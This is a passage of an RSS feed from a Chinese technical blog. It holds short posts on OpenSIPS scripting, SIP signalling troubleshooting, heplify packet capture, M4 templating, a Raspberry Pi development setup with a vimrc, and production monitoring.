&lt;p&gt;后来我自己在网上搜索，发现了解决问题的方法。&lt;/p&gt;
&lt;p&gt;以上所有的关于替换的问题，都是和编辑器的替换设置有关。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;打开一个笔记，然后点击右键&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;选择替换，可以看到里面有智能引号，只能破折号，智能连接，文本替换，建议把这几个都取消勾选&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;还有一个可能性，就是在**编辑-&amp;gt;拼写和语法-&amp;gt;自动拼写纠正，**这个要关闭。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    <item>
      <title>avp_db_query数值null值比较</title>
      <link>https://wdd.js.org/opensips/ch5/avp-db-query/</link>
      <pubDate>Wed, 29 Sep 2021 19:13:26 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/avp-db-query/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://opensips.org/docs/modules/2.4.x/avpops.html#func_avp_db_query&#34;&gt;avp_db_query&lt;/a&gt;是用来做数据库查询的，如果查到某列的值是NULL, 那么对应到脚本里应该如何比较呢？&lt;/p&gt;
&lt;p&gt;可以用avp的值与&amp;quot;&lt;!-- raw HTML omitted --&gt;&amp;quot;， 进行比较&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if ($avp(status) == &amp;#34;&amp;lt;null&amp;gt;&amp;#34;)
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://stackoverflow.com/questions/52675803/opensips-avp-db-query-cant-compare-null-value&#34;&gt;https://stackoverflow.com/questions/52675803/opensips-avp-db-query-cant-compare-null-value&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>简单实用的M4教程</title>
      <link>https://wdd.js.org/posts/2021/09/</link>
      <pubDate>Sat, 25 Sep 2021 12:22:19 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/09/</guid>
      <description>&lt;h1 id=&#34;文本处理的难点&#34;&gt;文本处理的难点&lt;/h1&gt;
&lt;p&gt;有一个文本文件，内容如下，摘抄其中两行内容如下，里面有两个配置db_addr, local_ip这两个配置，需要在不同环境要修改的。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;db_addr=1.2.3.4:3306
local_ip=192.168.2.4
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但是哪些地方要修改呢？为了提醒后续的维护者，我们给要修改的地方加个备注吧。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;db_addr=1.2.3.4:3306 # 这里要修改
local_ip=192.168.2.4 # 这里要修改
....
...
if len(a) = 1024 {  # 这里要修改1024
   ...
}
...
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;用sed替换&#34;&gt;用sed替换？&lt;/h1&gt;
&lt;p&gt;让别人一个一个地方去修改，也太麻烦了，有没有可能用脚本去处理呢？例如我们用DB_ADDR和LOCAL_IP这种字符串作为占位符，然后我们就可以用sed之类的命令去做替换了。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;db_addr=DB_ADDR
local_ip=LOCAL_IP
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sed -i &amp;#39;s/DB_ADDR/1.2.3.4:3306/g;s/LOCAL_IP/192.168.0.1/g&amp;#39; 1.cfg
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样做是有点方便了，但是也有以下几个问题&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如果定义的占位符太多，sed会变得越来越长&lt;/li&gt;
&lt;li&gt;如果某些占位符里本身就含有/或者一些特殊含义的字符，就需要做特殊处理了&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;用m4吧专业的人做专业的事情&#34;&gt;用M4吧，专业的人做专业的事情&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;apt-get install m4
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;通过命令行定义宏&#34;&gt;通过命令行定义宏&lt;/h2&gt;
&lt;p&gt;1.m4&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;db_addr=DB_ADDR
local_ip=LOCAL_IP
....
...
if len(a) = MAX_LEN {
   ...
}
...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;M4可以使用-D来定义宏和宏对应的值，默认输出到标准输出，我们可以用&amp;gt;将输出写到文件中&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;m4 -D DB_ADDR=1.2.3.4:3306 -D LOCAL_IP=192.168.2.2 -D MAX_LEN=2048 1.m4

db_addr=1.2.3.4:3306
local_ip=192.168.2.2
....
...
if 1 = 2048 {
   ...
}
...
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;用define语句定义宏&#34;&gt;用define语句定义宏&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;用define()语句来定义宏&lt;/li&gt;
&lt;li&gt;用`&amp;lsquo;来作为字符串引用，避免被展开&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;define(`DB_ADDR&amp;#39;, `1.2.3.4:3306&amp;#39;)
define(`LOCAL_IP&amp;#39;, `192.168.2.2&amp;#39;)
define(`MAX_LEN&amp;#39;, `2048&amp;#39;)

db_addr=DB_ADDR
local_ip=LOCAL_IP
....
...
if len(a) = MAX_LEN {
   ...
}
...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行命令&lt;code&gt;m4 1.m4&lt;/code&gt;, 可以看到宏展开，但是有很多空行。&lt;/p&gt;</description>
    </item>
    <item>
      <title>sendmsg failed on 0: Socket operation on non-socket</title>
      <link>https://wdd.js.org/opensips/ch7/sendmsg-failed/</link>
      <pubDate>Thu, 16 Sep 2021 10:04:16 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch7/sendmsg-failed/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ERROR:core:tcp_init_listener: could not get TCP protocol number
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CRITICAL:core:send_fd: sendmsg failed on 0: Socket operation on non-socket
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ERROR:core:send2child: send_fd failed
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不要将tcp_child设置为0&lt;/p&gt;</description>
    </item>
    <item>
      <title>信令路径逃逸分析</title>
      <link>https://wdd.js.org/opensips/ch7/escape-msg/</link>
      <pubDate>Wed, 15 Sep 2021 19:18:55 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch7/escape-msg/</guid>
      <description>&lt;h1 id=&#34;问题表现&#34;&gt;问题表现&lt;/h1&gt;
&lt;p&gt;在经过初始化请求之后，路径发现完成。在这个dialog中所有的请求，正常来ua1和ua2之间的所有请求，都应该经过us1和us2。&lt;/p&gt;
&lt;p&gt;如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch7/escape-msg/2022-12-02-13-56-16.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;某些时候，ua1可能直接把BYE消息直接发送给ua2, 但是一般ua1和ua2是存在uat网络的，所以这个BYE消息，ua2很可能收不到。&lt;/p&gt;
&lt;p&gt;问题的表现就是电话无法正常挂断。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch7/escape-msg/2022-12-02-13-56-36.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;问题分析&#34;&gt;问题分析&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;可能原因1: us1和us2没有做record-route, 导致请求直接根据某个请求的响应消息的Contact头，直接发送了。&lt;/li&gt;
&lt;li&gt;可能原因2: 某些请求的拓扑隐藏没有做好&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;拓扑隐藏问题具体分析&#34;&gt;拓扑隐藏问题具体分析&lt;/h2&gt;
&lt;p&gt;假如我们在us1上正确的做了拓扑隐藏，那么ua1的所有收到的响应，它的Contact头的地址都会改成us1的地址。那么ua1是无论如何都获取不到ua2的直接地址的。&lt;/p&gt;
&lt;p&gt;但是，假如某个消息处理的不对呢？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;注意180响应5到6, 其中us1正确的修改了Contact头&lt;/li&gt;
&lt;li&gt;ua1收到180后，立即发送了notify消息&lt;/li&gt;
&lt;li&gt;如果us1没有正确处理notify的响应的Contact头，us1就会把ua2的Contact信息发送给ua1。有些notify的响应带有Contact头，有些没带有。&lt;/li&gt;
&lt;li&gt;但是这里会出现一个&lt;strong&gt;竞争条件，invite的200ok和notify的200ok，消息到达的顺序，将影响ua2的Contact信息&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;如果ua1后收到invite的200ok, 此时ua1获取ua2的地址是us1&lt;/li&gt;
&lt;li&gt;如果ua2后收到notify的200ok, 此时ua2获取的ua2的地址就是ua2&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;所以问题的表现可能是有偶现的，&lt;strong&gt;这种问题处理其实是比较棘手的&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;当然也是有解决方案的
&lt;ul&gt;
&lt;li&gt;方案1， us1对notify正确处理响应消息Contact, 将其修改成us1&lt;/li&gt;
&lt;li&gt;方案2，us1直接删除notify响应消息的Contact头&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch7/escape-msg/2022-12-02-13-56-59.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>heplify SIP信令抓包客户端</title>
      <link>https://wdd.js.org/opensips/tools/heplify/</link>
      <pubDate>Sun, 12 Sep 2021 20:49:51 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/tools/heplify/</guid>
      <description>&lt;p&gt;hepfily是个独立的抓包程序，类似于tcpdump之类的，网络抓包程序，可以把抓到的sip包，编码为hep格式。然后送到hep server上，由hepserver负责包的整理和存储。&lt;/p&gt;
&lt;p&gt;heplify安装非常简单，在仓库的release页面，可以下载二进程程序。二进程程序赋予可执行权限后，可以直接在x86架构的机器上运行。&lt;/p&gt;
&lt;p&gt;因为heplify是go语言写的，你也可以基于源码，编译其他架构的二进制程序。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/sipcapture/heplify&#34;&gt;https://github.com/sipcapture/heplify&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-i 设定抓包的网卡&lt;/li&gt;
&lt;li&gt;-m 设置抓包模式为SIP&lt;/li&gt;
&lt;li&gt;-hs 设置hep server的地址&lt;/li&gt;
&lt;li&gt;-p 设置日志文件的日志&lt;/li&gt;
&lt;li&gt;-dim 设置过滤一些不关心的sip包&lt;/li&gt;
&lt;li&gt;-pr 设置抓包的端口范围&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nohup ./heplify &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;  -i eno1 &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;  -m SIP &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;  -hs 192.168.1.2:9060 &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;  -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/var/log/&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;  -dim OPTIONS,REGISTER &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;  -pr &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;18627-18628&amp;#34;&lt;/span&gt; &amp;amp;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;opensips模块本身就有proto_hep模块支持hep抓包，为什么我还要用heplify来抓包呢？&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;低于2.2版本的opensips不支持hep抓包&lt;/li&gt;
&lt;li&gt;opensips的hep抓包还是不太稳定。我曾遇到过因为hep抓包导致opensips崩溃的事故。如果用外部的抓包程序，即使抓包有问题，还是不会影响到opensips。&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    <item>
      <title>核心变量解读-100%</title>
      <link>https://wdd.js.org/opensips/ch5/core-var-2/</link>
      <pubDate>Thu, 09 Sep 2021 09:04:21 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/core-var-2/</guid>
      <description>&lt;h1 id=&#34;简介&#34;&gt;简介&lt;/h1&gt;
&lt;p&gt;OpenSIPS的路由脚本提供了几种不同类型的变量。不同类型的变量有以下几个方面的差异。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;变量的可见性&lt;/li&gt;
&lt;li&gt;变量引用的值&lt;/li&gt;
&lt;li&gt;变量的读写性质：有些变量是只读的，有些变量可读可写&lt;/li&gt;
&lt;li&gt;变量是否有多个值：有些变量只有一个值，有些变量有多个值&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;语法&#34;&gt;语法&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$(&amp;lt;context&amp;gt;name(subname)[index]{tramsformation})
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;除了name以外 ，其他都是可选的值。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;name(必传)：变量名的类型，例如pvar, avp, ru, DLG_status等等&lt;/li&gt;
&lt;li&gt;subname: 变量名称，例如hdr(From), avp(name)&lt;/li&gt;
&lt;li&gt;index: 索引，某些变量可以有多个值，类似于数组。可以用索引去引用对应的元素。从0开始，也可以是负值如-1, 表示倒数第一个。&lt;/li&gt;
&lt;li&gt;transformation: 转换。做一些格式转换，字符串截取等等操作&lt;/li&gt;
&lt;li&gt;context: 上下文。OpenSIP有两个上下午，请求&lt;code&gt;request&lt;/code&gt;、相应&lt;code&gt;reply&lt;/code&gt;。想想一个场景，你在一个相应路由里如何拿到请求路由的某个值呢？ 可以使用$(&lt;!-- raw HTML omitted --&gt;ru).  或者在一个失败路由里获取一个Concact的信息$(&lt;!-- raw HTML omitted --&gt;hdr(Contact))&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;举例：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;仅仅通过类型来引用：$ru&lt;/li&gt;
&lt;li&gt;通过类型和名称来引用：$hrd(Contact), 引用某个SIP header的值&lt;/li&gt;
&lt;li&gt;通过类型和索引来引用：$(ct[0])&lt;/li&gt;
&lt;li&gt;通过类型、名称、索引来引用：$(avp(addr)[0])&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;变量的类型&#34;&gt;变量的类型&lt;/h1&gt;
&lt;h2 id=&#34;脚本变量&#34;&gt;脚本变量&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch5/core-var-2/2022-12-02-17-32-09.png&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;脚本变量只有一个值&lt;/li&gt;
&lt;li&gt;脚本变量可读可写&lt;/li&gt;
&lt;li&gt;脚本变量在路由及其子路由中都是可见的&lt;/li&gt;
&lt;li&gt;脚本变量使用前务必先初始化，否则可能会引用到之前的值&lt;/li&gt;
&lt;li&gt;脚本变量的值可以是字符串，也可以是整数类型&lt;/li&gt;
&lt;li&gt;脚本变量读写比avp变量快&lt;/li&gt;
&lt;li&gt;脚本变量会持久存在一个OpenSIPS进程中&lt;/li&gt;
&lt;li&gt;将脚本变量设置为NULL, 实际上是将变量的值设置为&#39;0&amp;rsquo;,  脚本变量没有NULL值。&lt;/li&gt;
&lt;li&gt;脚本变量之存在与一个路由中&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用举例&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;route{
	$var(a) = 19
	$var(a) = &amp;#34;wdd&amp;#34;
	$var(a) =  &amp;#34;wdd&amp;#34; + &amp;#34;@&amp;#34; + $td;
  
  if(route(check_out, 1)){
  	xlog(&amp;#34;check error&amp;#34;);
  }
  
}

route[check_out]{
  # 注意，这里$var(a)的值就不存在了
	xlog(&amp;#34;$var(a)&amp;#34;);
  
  if ($param(1) &amp;gt; 1) {
  	return (-1);
  }
  return(1);
}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;avp变量&#34;&gt;avp变量&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch5/core-var-2/2022-12-02-17-32-26.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>使用树莓派3b&#43;作为辅助开发体验</title>
      <link>https://wdd.js.org/posts/2021/08/mlg4mt/</link>
      <pubDate>Mon, 30 Aug 2021 21:18:15 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/08/mlg4mt/</guid>
      <description>&lt;h1 id=&#34;配置&#34;&gt;配置&lt;/h1&gt;
&lt;p&gt;树莓派3B+的配置&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;4核1G&lt;/li&gt;
&lt;li&gt;CPU ARMv7 Processor&lt;/li&gt;
&lt;li&gt;64G SD卡&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;常用软件&#34;&gt;常用软件&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;neovim&lt;/li&gt;
&lt;li&gt;LXTerminal终端&lt;/li&gt;
&lt;li&gt;chrome浏览器&lt;/li&gt;
&lt;li&gt;谷歌拼音输入法&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;常用语言&#34;&gt;常用语言&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;golang&lt;/li&gt;
&lt;li&gt;c&lt;/li&gt;
&lt;li&gt;nodejs&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;外设&#34;&gt;外设&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;键盘鼠标： 雷柏 无线机械键盘加鼠标 150块左右&lt;/li&gt;
&lt;li&gt;屏幕：一块ipad大小外接屏幕，400块左右&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;常用工作&#34;&gt;常用工作&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Golang UDP Server开发， 总体还算流畅。前提时不要加载太多的neovim插件，特别象coc-vim, go-vim等插件，安装过后让你卡的绝望。每次当我绝望之时，我就关闭了图形界面，回到终端继续干活。但是即使使用纯文本方式登录，运行vim还是很卡。&lt;/li&gt;
&lt;li&gt;后来我在macbook pro上也用neovim开发，发现也是很卡。于是我就释然了，9千多的macbook都卡，300多的树莓派卡一点怎么了！&lt;/li&gt;
&lt;li&gt;但是卡顿还是非常影响心情的，于是我就大量精简vim的插件。&lt;/li&gt;
&lt;li&gt;我基本上就用两个插件，都是和状态栏有关的。其他十二个插件都给注释掉了&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;call plug#begin(&amp;#39;~/.vim/plugged&amp;#39;)

Plug &amp;#39;vim-airline/vim-airline&amp;#39;
Plug &amp;#39;vim-airline/vim-airline-themes&amp;#39;
Plug &amp;#39;jiangmiao/auto-pairs&amp;#39;
&amp;#34;Plug &amp;#39;yonchu/accelerated-smooth-scroll&amp;#39;
&amp;#34;Plug &amp;#39;preservim/tagbar&amp;#39;, { &amp;#39;for&amp;#39;: [&amp;#39;go&amp;#39;, &amp;#39;c&amp;#39;]}
&amp;#34;Plug &amp;#39;airblade/vim-gitgutter&amp;#39;
&amp;#34;Plug &amp;#39;fatih/vim-go&amp;#39;, { &amp;#39;do&amp;#39;: &amp;#39;:GoUpdateBinaries&amp;#39;, &amp;#39;for&amp;#39;: &amp;#39;go&amp;#39; }
&amp;#34;Plug &amp;#39;dense-analysis/ale&amp;#39;
&amp;#34;Plug &amp;#39;vim-scripts/matchit.zip&amp;#39;
&amp;#34;Plug &amp;#39;pangloss/vim-javascript&amp;#39;, {&amp;#39;for&amp;#39;:&amp;#39;javascript&amp;#39;}
&amp;#34;Plug &amp;#39;leafgarland/typescript-vim&amp;#39;
&amp;#34;Plug &amp;#39;neoclide/coc.nvim&amp;#39;, {&amp;#39;branch&amp;#39;: &amp;#39;release&amp;#39;}
&amp;#34;Plug &amp;#39;jremmen/vim-ripgrep&amp;#39;
&amp;#34;Plug &amp;#39;plasticboy/vim-markdown&amp;#39;
&amp;#34;Plug &amp;#39;mzlogin/vim-markdown-toc&amp;#39;
call plug#end()


filetype plugin indent on

filetype plugin on
filetype indent on
set guicursor=
set history=1000
let g:netrw_banner=0
let g:ale_linters = {
\   &amp;#39;javascript&amp;#39;: [&amp;#39;standard&amp;#39;],
\   &amp;#39;typescript&amp;#39;: [&amp;#39;tsserver&amp;#39;]
\}
let g:ale_fixers = {&amp;#39;javascript&amp;#39;: [&amp;#39;standard&amp;#39;]}
let g:ale_lint_on_save = 1
let g:ale_fix_on_save = 1
let g:ale_typescript_tsserver_executable=&amp;#39;tsserver&amp;#39;
let g:airline#extensions#tabline#enabled = 1
let g:ale_set_loclist = 0
let g:ale_set_quickfix = 1
let g:ale_open_list = 0
let g:vim_markdown_folding_disabled = 1
let g:vmt_cycle_list_item_markers = 1
let g:tagbar_sort = 0
&amp;#34; colorscheme codedark
&amp;#34; let g:airline_theme = &amp;#39;codedark&amp;#39;
&amp;#34;
&amp;#34; buffer
let mapleader = &amp;#34;,&amp;#34;
nnoremap &amp;lt;Leader&amp;gt;j :bp&amp;lt;CR&amp;gt;      &amp;#34; previous buffer
nnoremap &amp;lt;Leader&amp;gt;k :bn&amp;lt;CR&amp;gt;      &amp;#34; next buffer
nnoremap &amp;lt;Leader&amp;gt;n :bf&amp;lt;CR&amp;gt;      &amp;#34; previous buffer
nnoremap &amp;lt;Leader&amp;gt;m :bl&amp;lt;CR&amp;gt;      &amp;#34; next buffer
nnoremap &amp;lt;Leader&amp;gt;l :b#&amp;lt;CR&amp;gt;      &amp;#34; previous buffer
nnoremap &amp;lt;Leader&amp;gt;e :e&amp;lt;CR&amp;gt;      &amp;#34; open netrw
nnoremap &amp;lt;Leader&amp;gt;d :bd&amp;lt;CR&amp;gt;             &amp;#34; close buffer
nnoremap &amp;lt;Leader&amp;gt;g :!go fmt %&amp;lt;CR&amp;gt;             &amp;#34; go fmt current file
nnoremap &amp;lt;Leader&amp;gt;tm :%s/\s\+$//e&amp;lt;CR&amp;gt;             &amp;#34; trim space at endofline
nnoremap &amp;lt;Leader&amp;gt;a A
nnoremap &amp;lt;Leader&amp;gt;w :w&amp;lt;CR&amp;gt;
nnoremap &amp;lt;Leader&amp;gt;c :clo&amp;lt;CR&amp;gt;
nnoremap &amp;lt;Leader&amp;gt;/ :Rg&amp;lt;Space&amp;gt;
inoremap jj &amp;lt;ESC&amp;gt;
highlight CocErrorFloat ctermfg=White

let g:netrw_list_hide= &amp;#39;.*\.swp$&amp;#39;
let g:ctrlp_custom_ignore = {
  \ &amp;#39;dir&amp;#39;:  &amp;#39;\v[\/]\.?(git|hg|svn|node_modules)$&amp;#39;,
  \ &amp;#39;file&amp;#39;: &amp;#39;\v\.(exe|so|dll|min.js)$&amp;#39;,
  \ &amp;#39;link&amp;#39;: &amp;#39;some_bad_symbolic_links&amp;#39;,
  \ }

set autoread
&amp;#34; au CursorHold,CursorHoldI * :e
&amp;#34; au FocusGained,BufEnter * :e
set so=7
set ruler
set cmdheight=2

set hid
set backspace=eol,start,indent
set whichwrap+=&amp;lt;,&amp;gt;,h,l
set ignorecase
set smartcase
set hlsearch
set incsearch
set showmatch
set mat=2
syntax enable
set background=dark
set ffs=unix,dos,mac
&amp;#34;set ai &amp;#34;Auto indent
&amp;#34;set si &amp;#34;Smart indent
set wrap &amp;#34;Wrap lines
set cursorline
set tabstop=4
set shiftwidth=4
set expandtab
set background=dark
&amp;#34; colorscheme solarized
&amp;#34; let g:ackprg = &amp;#39;rg --vimgrep --type-not sql --smart-case&amp;#39;
map ; :
autocmd FileType javascript setlocal ts=2 sts=2 shiftwidth=2
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;但是没有go-vim写golang还是不太方便的，特别是保存的时候格式化，但是也有方案, 执行vim的Ex命令，&lt;code&gt;：!go fmt %&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;视频&#34;&gt;视频&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;看视频是非常危险的行为，有可能需要强制关机重启。&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>生产环境监控告警</title>
      <link>https://wdd.js.org/opensips/ch3/prd-warning/</link>
      <pubDate>Thu, 19 Aug 2021 20:08:28 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch3/prd-warning/</guid>
      <description>&lt;h1 id=&#34;日志监控&#34;&gt;日志监控&lt;/h1&gt;
&lt;p&gt;务必监控opensips日志，如果其中出现了CRITICAL关键字, 很可能马上opensips就要崩溃。&lt;/p&gt;
&lt;p&gt;第一要发出告警信息。&lt;!-- raw HTML omitted --&gt;第二要有主动的自动重启策略，例如使用systemd启动的话，服务崩溃会会立马被重启。或者用docker或者k8s，这些虚拟化技术，可以让容器崩溃后自动重启。&lt;/p&gt;
&lt;h1 id=&#34;指标监控&#34;&gt;指标监控&lt;/h1&gt;
&lt;p&gt;opensips有内部的统计模块，可以很方便的通过opensipsctl或者相关的http的mi接口获取到内部的统计数据。&lt;/p&gt;
&lt;p&gt;以下给出几个关键的统计指标：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;rsquo;total_size&amp;rsquo;,   全部内存&lt;/li&gt;
&lt;li&gt;&amp;lsquo;used_size&amp;rsquo;,   使用的内存&lt;/li&gt;
&lt;li&gt;&amp;lsquo;real_used_size&amp;rsquo;,   真是使用的内存&lt;/li&gt;
&lt;li&gt;&amp;lsquo;max_used_size&amp;rsquo;,   最大使用的内存&lt;/li&gt;
&lt;li&gt;&amp;lsquo;free_size&amp;rsquo;,   空闲内存&lt;/li&gt;
&lt;li&gt;&amp;lsquo;fragments&amp;rsquo;,&lt;/li&gt;
&lt;li&gt;&amp;lsquo;active_dialogs&amp;rsquo;,   接通状态的通话&lt;/li&gt;
&lt;li&gt;&amp;rsquo;early_dialogs&amp;rsquo;,     振铃状态的通话&lt;/li&gt;
&lt;li&gt;&amp;lsquo;inuse_transactions&amp;rsquo;,   正在使用的事务&lt;/li&gt;
&lt;li&gt;&amp;lsquo;waiting_udp&amp;rsquo;,   堆积的udp消息&lt;/li&gt;
&lt;li&gt;&amp;lsquo;waiting_tcp&amp;rsquo;     堆积的tcp消息&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当然还有很多的一些指标，可以使用：&lt;code&gt;opensipsctl fifo get_statistics all&lt;/code&gt;来获取。&lt;/p&gt;</description>
    </item>
    <item>
      <title>opensips崩溃分析</title>
      <link>https://wdd.js.org/opensips/ch7/crash/</link>
      <pubDate>Thu, 19 Aug 2021 19:30:14 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch7/crash/</guid>
      <description>&lt;h1 id=&#34;core-dump文件在哪里&#34;&gt;core dump文件在哪里？&lt;/h1&gt;
&lt;p&gt;一般情况下，opensips在崩溃的时候，会产生core dump文件。这个文件一般位于跟目录下，名字如core.xxxx等的。&lt;/p&gt;
